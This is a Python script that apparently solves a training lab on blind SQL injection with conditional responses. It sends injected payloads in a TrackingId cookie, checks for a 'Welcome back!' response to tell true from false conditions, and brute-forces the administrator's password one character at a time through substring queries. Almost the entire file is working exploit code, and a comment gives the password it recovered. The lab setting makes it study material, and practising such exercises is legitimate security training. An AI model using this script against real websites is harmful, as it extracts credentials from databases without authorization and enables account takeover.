import requests as r
from time import sleep
import string


#Lab name: Blind SQL injection with conditional responses

# lab description : 
# table name : Users
# column name : username, password

link = "" # without the last backslash



def test_sqli(my_cookie, vuln):

    payload = my_cookie+vuln
    my_req = r.get(link, cookies = {"TrackingId":payload})
    response = my_req.text
    print(response)



#test_sqli("PADjzghrkB2UA8vF", "\' and 1=\'1")  # returns Welcome 
#test_sqli("PADjzghrkB2UA8vF", "\' and 1=\'2")   # dont return Welcome


def dump_admin_passwd(my_cookie):

    alpha_num = string.ascii_lowercase + string.ascii_uppercase + string.digits
    full_iteration=len(alpha_num) 
    counter=0 
    password=""
    check_carac=1 # start substring(query ,1 ,check_carac)  
    while counter !=full_iteration: # if we have enumerate all posible caractere for a specific position  we have finish
        for i in alpha_num:
            counter+=1
            payload = my_cookie + "\' and substring((select password from users where username=\'administrator\'),1"  + ","+str(check_carac) + ")=\'"+password + i

            
            my_req = r.get(link, cookies = {"TrackingId":payload})
            response = my_req.text
            if "Welcome back!" in  response: # if we found the string "Welcome back!" in our http response we have trigger the good condition
                password+=i
                print("password: " , password)
                check_carac+=1
                counter=0
                break
            sleep(0.1)

    print(password)

dump_admin_passwd("PADjzghrkB2UA8vF") 
# after a few second the password pop : in my case it is vnf8nl1n66083zg2ok4w